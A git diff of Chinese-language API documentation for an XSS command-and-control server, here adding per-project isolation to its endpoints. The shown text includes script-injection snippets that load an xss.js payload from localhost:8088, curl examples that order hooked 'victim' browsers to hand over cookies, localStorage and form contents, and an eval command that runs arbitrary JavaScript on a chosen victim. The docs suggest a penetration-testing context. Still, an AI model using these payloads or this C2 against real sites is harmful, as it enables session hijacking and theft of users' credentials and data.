@@ -16,6 +16,15 @@ http://localhost:8088
 - ✅ 跨域资源共享 (CORS)
 - ✅ 客户端角色管理
 - ✅ 命令广播和定向发送
+- ✅ **项目级别数据隔离** (NEW)
+
+### 🔒 项目隔离机制
+**重要变更：所有连接和API操作现在都需要指定项目ID进行隔离**
+
+- 每个WebSocket连接必须关联特定项目
+- API查询和命令执行严格限制在指定项目内
+- 不同项目的会话数据完全隔离，互不可见
+- 用户只能操作属于自己项目的靶机会话
 
 ---
 
@@ -23,7 +32,7 @@ http://localhost:8088
 
 ### 建立 WebSocket 连接
 ```
-ws://localhost:8088/ws?role={role}&id={client_id}
+ws://localhost:8088/ws?role={role}&id={client_id}&project={project_id}
 ```
 
 **查询参数:**
@@ -31,26 +40,30 @@ ws://localhost:8088/ws?role={role}&id={client_id}
   - `"victim"` - 靶机角色，接收并执行命令
   - `"attacker"` - 攻击者角色，发送命令
 - `id` (可选, string): 自定义客户端ID，不提供时自动生成
+- `project` (必需, string): 项目JID，用于隔离不同项目的会话
 
 **连接示例:**
 ```javascript
 // 靶机连接
-const victimWs = new WebSocket('ws://localhost:8088/ws?role=victim&id=target_001');
+const victimWs = new WebSocket('ws://localhost:8088/ws?role=victim&id=target_001&project=PROJ123456');
 
 // 攻击者连接  
-const attackerWs = new WebSocket('ws://localhost:8088/ws?role=attacker&id=hacker_001');
+const attackerWs = new WebSocket('ws://localhost:8088/ws?role=attacker&id=hacker_001&project=PROJ123456');
 ```
 
 ---
 
 ## 👥 客户端管理 API
 
-### 1. 获取所有连接的客户端
+### 1. 获取指定项目的所有连接的客户端
 ```http
-GET /api/clients
+GET /api/clients?project={project_id}
 ```
 
-**功能:** 获取当前所有连接的客户端列表
+**功能:** 获取指定项目当前所有连接的客户端列表
+
+**查询参数:**
+- `project` (必需, string): 项目JID
 
 **响应示例:**
 ```json
@@ -61,6 +74,7 @@ GET /api/clients
     {
       "id": "victim_abc123",
       "role": "victim",
+      "project_id": "PROJ123456",
       "connect_time": "2025-01-20T10:30:00Z",
       "last_seen": "2025-01-20T10:35:00Z",
       "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
@@ -88,6 +102,7 @@ GET /api/clients/{client_id}
   "data": {
     "id": "victim_abc123",
     "role": "victim",
+    "project_id": "PROJ123456",
     "connect_time": "2025-01-20T10:30:00Z",
     "last_seen": "2025-01-20T10:35:00Z",
     "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
@@ -111,13 +126,16 @@ GET /api/clients/{client_id}
 
 ## 💻 命令执行 API
 
-### 1. 向所有靶机广播命令
+### 1. 向项目内所有靶机广播命令
 ```http
-POST /api/commands
+POST /api/commands?project={project_id}
 Content-Type: application/json
 ```
 
-**功能:** 向所有连接的靶机发送命令
+**功能:** 向指定项目内所有连接的靶机发送命令
+
+**查询参数:**
+- `project` (必需, string): 项目JID
 
 **请求体:**
 ```json
@@ -140,6 +158,7 @@ Content-Type: application/json
   "message": "命令执行完成，收到 3 个结果",
   "data": {
     "command": "cookie",
+    "project_id": "PROJ123456",
     "target_id": "",
     "args": {
       "additional_param": "value"
@@ -168,14 +187,17 @@ Content-Type: application/json
 
 ### 2. 向指定客户端发送命令
 ```http
-POST /api/clients/{client_id}/commands
+POST /api/clients/{client_id}/commands?project={project_id}
 Content-Type: application/json
 ```
 
-**功能:** 向指定的客户端发送命令
+**功能:** 向指定项目内的指定客户端发送命令
 
 **路径参数:**
 - `client_id` (必需, string): 目标客户端ID
+
+**查询参数:**
+- `project` (必需, string): 项目JID
 
 **请求体:**
 ```json
@@ -194,6 +216,7 @@ Content-Type: application/json
   "message": "命令执行完成，收到 1 个结果", 
   "data": {
     "command": "eval",
+    "project_id": "PROJ123456",
     "target_id": "victim_abc123",
     "args": {
       "code": "alert('XSS Test')"
@@ -215,7 +238,7 @@ Content-Type: application/json
 
 ### 3. 使用目标ID发送命令（替代方法）
 ```http
-POST /api/commands
+POST /api/commands?project={project_id}
 Content-Type: application/json
 ```
 
@@ -228,7 +251,7 @@ Content-Type: application/json
 }
 ```
 
-**说明:** 当提供 `target_id` 时，命令将仅发送给指定客户端而非广播
+**说明:** 当提供 `target_id` 时，命令将仅发送给指定项目内的指定客户端而非广播
 
 ## ⚡ API 执行机制
 
@@ -340,12 +363,15 @@ Content-Type: application/json
 
 ### 获取 JavaScript 载荷
 ```http
-GET /xss.js
+GET /xss.js?project={project_id}
 ```
 
 **功能:** 获取用于 XSS 注入的 JavaScript 载荷代码
 
-**响应:** 返回自动连接到服务器的 JavaScript 代码
+**查询参数:**
+- `project` (必需, string): 项目JID
+
+**响应:** 返回自动连接到指定项目的 JavaScript 代码
 
 **载荷功能:**
 - 🔗 自动建立 WebSocket 连接
@@ -356,11 +382,11 @@ GET /xss.js
 **使用方式:**
 ```html
 <!-- 直接注入 -->
-<script src="http://localhost:8088/xss.js"></script>
+<script src="http://localhost:8088/xss.js?project=PROJ123456"></script>
 
 <!-- 或通过 JavaScript -->
 <script>
-document.write('<script src="http://localhost:8088/xss.js"><\/script>');
+document.write('<script src="http://localhost:8088/xss.js?project=PROJ123456"><\/script>');
 </script>
 ```
 
@@ -453,14 +479,14 @@ document.write('<script src="http://localhost:8088/xss.js"><\/script>');
 
 ## 🔍 使用示例
 
-### 示例 1: 获取所有连接的客户端
+### 示例 1: 获取指定项目的所有连接的客户端
 ```bash
-curl -X GET "http://localhost:8088/api/clients"
+curl -X GET "http://localhost:8088/api/clients?project=PROJ123456"
 ```
 
-### 示例 2: 向所有靶机发送 Cookie 提取命令
+### 示例 2: 向项目内所有靶机发送 Cookie 提取命令
 ```bash
-curl -X POST "http://localhost:8088/api/commands" \
+curl -X POST "http://localhost:8088/api/commands?project=PROJ123456" \
   -H "Content-Type: application/json" \
   -d '{
     "command": "cookie"
@@ -493,9 +519,9 @@ curl -X POST "http://localhost:8088/api/commands" \
 }
 ```
 
-### 示例 3: 在指定靶机执行 JavaScript
+### 示例 3: 在指定项目的指定靶机执行 JavaScript
 ```bash
-curl -X POST "http://localhost:8088/api/clients/victim_123/commands" \
+curl -X POST "http://localhost:8088/api/clients/victim_123/commands?project=PROJ123456" \
   -H "Content-Type: application/json" \
   -d '{
     "command": "eval",
@@ -525,9 +551,9 @@ curl -X POST "http://localhost:8088/api/clients/victim_123/commands" \
 }
 ```
 
-### 示例 4: 从所有靶机获取表单信息
+### 示例 4: 从项目内所有靶机获取表单信息
 ```bash
-curl -X POST "http://localhost:8088/api/commands" \
+curl -X POST "http://localhost:8088/api/commands?project=PROJ123456" \
   -H "Content-Type: application/json" \
   -d '{
     "command": "forms"
@@ -541,7 +567,7 @@ curl -X GET "http://localhost:8088/api/clients/victim_123"
 
 ### 示例 6: 获取本地存储数据
 ```bash
-curl -X POST "http://localhost:8088/api/commands" \
+curl -X POST "http://localhost:8088/api/commands?project=PROJ123456" \
   -H "Content-Type: application/json" \
   -d '{
     "command": "localStorage"
